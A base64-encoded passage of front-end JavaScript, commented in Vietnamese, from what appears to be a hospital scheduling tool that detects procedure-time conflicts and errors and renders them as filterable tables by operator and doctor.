G7kWMiIGtow6FjIMSRYSBz4buRIChvdXRsaWVyKQ0KZnVuY3Rpb24gZ2V0SGVyYk91dGxpZXJUb3RhbCgpIHsNCiAgY29uc3QgaGVyYnMgPSBBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgPyB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgOiBbXTsNCiAgY29uc3QgY291bnRzQnlEYXRlID0ge307DQogIGhlcmJzLmZvckVhY2goaCA9PiB7DQogICAgY29uc3QgZCA9IGguZGF0ZTsNCiAgICBjb25zdCBuID0gKGgub3BlcmF0b3IgfHwgJ0tow7RuZyBjw7MnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCiAgICBpZiAoIWNvdW50c0J5RGF0ZVtkXSkgY291bnRzQnlEYXRlW2RdID0ge307DQogICAgY291bnRzQnlEYXRlW2RdW25dID0gKGNvdW50c0J5RGF0ZVtkXVtuXSB8fCAwKSArIDE7DQogIH0pOw0KICBsZXQgb3V0bGllcnMgPSAwOw0KICBPYmplY3QudmFsdWVzKGNvdW50c0J5RGF0ZSkuZm9yRWFjaChtYXAgPT4gew0KICAgIGNvbnN0IGVudHJpZXMgPSBPYmplY3QuZW50cmllcyhtYXApLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgY29uc3QgdG9wID0gZW50cmllc1swXTsgaWYgKCF0b3ApIHJldHVybjsNCiAgICBjb25zdCB0b3BOYW1lID0gdG9wWzBdOw0KICAgIGVudHJpZXMuZm9yRWFjaCgoW25hbWUsIGNudF0pID0+IHsgaWYgKG5hbWUgIT09IHRvcE5hbWUpIG91dGxpZXJzICs9IGNudDsgfSk7DQogIH0pOw0KICByZXR1cm4gb3V0bGllcnM7DQp9DQoNCi8vIMSQ4bq/bSBs4buXaSBzYWkgdGjhu51pIGdpYW4gKGvhur90IHRow7pjIDw9IGLhuq90IMSR4bqndSwgxJHhu4tuaCBk4bqhbmcgc2FpLCBzYWkgcGjDunQgc28gduG7m2kgcXV5IMSR4buLbmgsLi4uKQ0KZnVuY3Rpb24gZ2V0VGltZUVycm9yVG90YWwoKSB7DQogIC8vIMSQ4bq/bSDEkcO6bmcgdGhlbyBz4buRIGjDoG5nIGzhu5dpIMSRYW5nIGhp4buDbiB0aOG7iw0KICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsgLy8gdsO5bmcgYuG6o25nIGzhu5dpIHRo4budaSBnaWFuDQogIGlmICghY29udGFpbmVyKSByZXR1cm4gMDsNCiAgcmV0dXJuIGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yQWxsKCd0ci5lcnJvci1yb3cnKS5sZW5ndGg7DQp9DQoNCmZ1bmN0aW9uIGdldENvbmZsaWN0VG90YWwoKSB7DQogIC8vIMSQ4bq/bSDEkcO6bmcgdGhlbyBz4buRIGjDoG5nIHh1bmcgxJHhu5l0IHRyb25nIGvhur90IHF14bqjDQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsgLy8gdGJvZHkgY+G7p2EgYuG6o25nIGvhur90IHF14bqjDQogIGlmICghdGJvZHkpIHJldHVybiAwOw0KICByZXR1cm4gdGJvZHkucXVlcnlTZWxlY3RvckFsbCgndHIuY29uZmxpY3Qtcm93JykubGVuZ3RoOw0KfQ0KDQoNCg0KDQoNCg0KDQoNCiAgICAgICBmdW5jdGlvbiBkaXNwbGF5UmVzdWx0cyhwcm9jZWR1cmVzLCBza2lwcGVkUm93cyA9IDApIHsNCiAgICBhbGxQcm9jZWR1cmVzID0gcHJvY2VkdXJlczsNCiAgICANCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChwcm9jZWR1cmVzLm1hcChwID0+IHAub3BlcmF0b3IpKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdEVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdEVycm9yLmlubmVySFRNTCA9IG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTDsgLy8gxJDhu5NuZyBi4buZIG7hu5lpIGR1bmcNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JGaWx0ZXJFcnJvcicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBjb25mbGljdFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuY29uZmxpY3QpOw0KICAgICAgICAgICAgY29uc3QgY29uZmxpY3RDb3VudCA9IGNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGg7DQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBO4bq/dSBraMO0bmcgY8OzIGzhu5dpLCBjdeG7mW4geHXhu5FuZyBwaOG6p24ga+G6v3QgcXXhuqMNCiAgICBpZiAoZXJyb3JMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgY29uc3QgcmVzdWx0U2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJyk7DQogICAgICAgICAgICBpZiAocmVzdWx0U2VjdGlvbikgew0KICAgICAgICAgICAgICAgIHNtb290aFNjcm9sbFRvKHJlc3VsdFNlY3Rpb24sIC00MCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0sIDMwMCk7DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBmaWx0ZXJCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykudmFsdWU7DQoNCiBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QudG9nZ2xlKCdzaG93LWRvY3RvcicsIHNob3dEb2N0b3IpOw0KICAgIC8vID09PT09IDEuIEzhu4xDIFbDgCBISeG7gk4gVEjhu4ogQuG6ok5HIEvhur5UIFFV4bqiIEtJ4buCTSBUUkEgWFVORyDEkOG7mFQgPT09PT0NCiAgICBjb25zdCBmaWx0ZXJlZFByb2NlZHVyZXMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gYWxsUHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLmNvbmZsaWN0KSANCiAgICAgICAgOiBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpICYmIHAuY29uZmxpY3QpOw0KDQogICAgY29uc3QgcmVzdWx0Qm9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRCb2R5Jyk7DQogICAgcmVzdWx0Qm9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIC8vIE5ow7NtIGPDoWMgdGjhu6cgdGh14bqtdCB4dW5nIMSR4buZdCB24bubaSBuaGF1DQogICAgY29uc3QgY29uZmxpY3RHcm91cHMgPSBbXTsNCiAgICBjb25zdCBwcm9jZXNzZWRSb3dzID0gbmV3IFNldCgpOw0KDQogICAgZmlsdGVyZWRQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvY2Vzc2VkUm93cy5oYXMocHJvYy5yb3dJbmRleCkpIHsNCiAgICAgICAgICAgIGNvbnN0IGdyb3VwID0gW3Byb2NdOw0KICAgICAgICAgICAgcHJvY2Vzc2VkUm93cy5hZGQocHJvYy5yb3dJbmRleCk7DQoNCiAgICAgICAgICAgIC8vIFTDrG0gdGjhu6cgdGh14bqtdCBsacOqbiBxdWFuIHRyb25nIHh1bmcgxJHhu5l0DQogICAgICAgICAgICBpZiAocHJvYy5jb25mbGljdFJlYXNvbikgew0KICAgICAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0TWF0Y2hlcyA9IHByb2MuY29uZmxpY3RSZWFzb24ubWF0Y2goL0Lhu4duaCBuaMOibjogKC4qPyk8YnI+4oCiIE5nw6B5OiAoLio/KTxicj7igKIgVGjhu51pIGdpYW46ICguKj8pLS9nKTsNCiAgICAgICAgICAgICAgICBpZiAoY29uZmxpY3RNYXRjaGVzKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0TWF0Y2hlcy5mb3JFYWNoKG1hdGNoID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhdGllbnROYW1lID0gbWF0Y2gubWF0Y2goL0Lhu4duaCBuaMOibjogKC4qPyk8YnI+LylbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXRlID0gbWF0Y2gubWF0Y2goL05nw6B5OiAoLio/KTxicj4vKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWUgPSBtYXRjaC5tYXRjaCgvVGjhu51pIGdpYW46ICguKj8pLS8pWzFdOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjb25mbGljdFByb2MgPSBmaWx0ZXJlZFByb2NlZHVyZXMuZmluZChwID0+IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAucGF0aWVudE5hbWUgPT09IHBhdGllbnROYW1lICYmIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuZGF0ZSA9PT0gZGF0ZSAmJiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLmRpc3BsYXlTdGFydCA9PT0gdGltZSAmJg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICFwcm9jZXNzZWRSb3dzLmhhcyhwLnJvd0luZGV4KQ0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbmZsaWN0UHJvYykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdyb3VwLnB1c2goY29uZmxpY3RQcm9jKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzZWRSb3dzLmFkZChjb25mbGljdFByb2Mucm93SW5kZXgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjb25mbGljdEdyb3Vwcy5wdXNoKGdyb3VwKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAvLyBIaeG7g24gdGjhu4sga+G6v3QgcXXhuqMNCiAgICBjb25mbGljdEdyb3Vwcy5mb3JFYWNoKGdyb3VwID0+IHsNCiAgICAgICAgZ3JvdXAuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCdjb25mbGljdC1yb3cnKTsNCiAgICAgICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wYXRpZW50TmFtZX0gPGJyLz4gJHtwcm9jLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtwcm9jLmRhdGV9PGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSAtICR7cHJvYy5kaXNwbGF5RW5kfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke3Byb2MuZG9jdG9yfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0idGltZS1zdWdnZXN0aW9uIj4ke3Byb2Muc3VnZ2VzdGlvbiB8fCAnS2jDtG5nIGPDsyB4dW5nIMSR4buZdCd9PC90ZD4NCiAgICAgICAgICAgIGA7DQogICAgICAgICAgICByZXN1bHRCb2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgICAgIH0pOw0KDQogICAgICAgIC8vIFRow6ptIGTDsm5nIHBow6JuIGPDoWNoDQogICAgICAgIGlmIChncm91cC5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBjb25zdCBzZXBhcmF0b3IgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICAgICAgc2VwYXJhdG9yLmlubmVySFRNTCA9ICc8dGQgY29sc3Bhbj0iOCIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD4nOw0KICAgICAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChzZXBhcmF0b3IpOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgICAvLyBO4bq/dSBraMO0bmcgY8OzIG5ow7NtIG7DoG8gdGjDrCB0aMOqbSBkw7JuZyBiw6FvICJLaMO0bmcgY8OzIGzhu5dpIg0KICAgIGlmIChjb25mbGljdEdyb3Vwcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI1ImNsYXNzPSJoZXJiLXJvdyBjb25mbGljdC1yb3ciPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0NCg0KICAgIC8vID09PT09IDIuIEzhu4xDIFbDgCBISeG7gk4gVEjhu4ogQuG6ok5HIEzhu5ZJID09PT09DQpjb25zdCBvcGVyYXRvckVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKS52YWx1ZTsNCiBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yRXJyb3IgPT09ICdhbGwnIA0KICAgPyBlcnJvckxvZyANCiAgIDogZXJyb3JMb2cuZmlsdGVyKGVycm9yID0+DQogICAgICAgZXJyb3IuZGV0YWlscyAmJg0KICAgICAgZXJyb3IuZGV0YWlscy5vcGVyYXRvciAmJg0KICAgICAgIGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yRXJyb3IucmVwbGFjZSgvLC9nLCAnJykNCiAgICApOw0KDQogICAgLy8gSGnhu4NuIHRo4buLIGzhu5dpIMSRw6MgbOG7jWMNCiAgICBjb25zdCBlcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gYDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PiA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiIGNsYXNzPSJlcnJvci1kZXRhaWwiPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC90ZD48L3RyPjwvdGJvZHk+PC90YWJsZT5gOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQoNCiAgICBmaWx0ZXJlZEVycm9ycy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaWYgKGVycm9yLmRldGFpbHMpIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucGF0aWVudE5hbWUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQoJCQkJPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3IuZGV0YWlscy5zdGFydFRpbWUgPyBgJHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZX0gLSAke2Vycm9yLmRldGFpbHMuZW5kVGltZX1gIDogJ0tow7RuZyBjw7MnDQogICAgICAgICAgICAgICAgfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICAgICAgICAgPGI+PGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0PC9mb250PjwvYj4gKFF1eSDEkeG7i25oOiAke2Vycm9yLmRldGFpbHMuZXhwZWN0ZWR9IHBow7p0KWAgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9ICR7ZXJyb3Iucm93ID8gJyhEw7JuZyAnICsgZXJyb3Iucm93ICsgJyknIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KZnVuY3Rpb24gZGlzcGxheUZpbHRlcmVkRXJyb3JzKGZpbHRlcmVkRXJyb3JzKSB7DQogICAgY29uc3QgZXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsNCiAgICANCiAgICBpZiAoZmlsdGVyZWRFcnJvcnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICBmaWx0ZXJlZEVycm9ycy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaWYgKGVycm9yLmRldGFpbHMpIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucGF0aWVudE5hbWUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5vcGVyYXRvciA/IGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgOiAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRldGFpbHMubmdheVRodWNIaWVuIHx8IChlcnJvci5kZXRhaWxzLmRhdGUgfHwgJ0tow7RuZyBjw7MnKX0gPGJyLz4ke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lID8gYCR7ZXJyb3IuZGV0YWlscy5zdGFydFRpbWV9IC0gJHtlcnJvci5kZXRhaWxzLmVuZFRpbWV9YCA6ICdLaMO0bmcgY8OzJ308L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfQ0KICAgICAgICAgICAgICAgICAgICA8Yj48Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLmRldGFpbHMuZXhwZWN0ZWQgPyBgJHtlcnJvci5kZXRhaWxzLmFjdHVhbH0gcGjDunQ8L2ZvbnQ+PC9iPiAgIChRdXkgxJHhu4tuaDogJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkfSBwaMO6dClgIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI2IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSAke2Vycm9yLnJvdyA/ICcoRMOybmcgJyArIGVycm9yLnJvdyArICcpJyA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0NCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQogICAgICAgIGZ1bmN0aW9uIGxvZ0Vycm9yKG1lc3NhZ2UsIHJvdyA9IG51bGwsIGRldGFpbHMgPSBudWxsKSB7DQogICAgICAgICAgICBlcnJvckxvZy5wdXNoKHsNCiAgICAgICAgICAgICAgICBtZXNzYWdlLA0KICAgICAgICAgICAgICAgIHJvdywNCiAgICAgICAgICAgICAgICBkZXRhaWxzLA0KICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0xvY2FsZVRpbWVTdHJpbmcoKSwNCiAgICAgICAgICAgICAgICB1c2VyOiBjdXJyZW50VXNlcg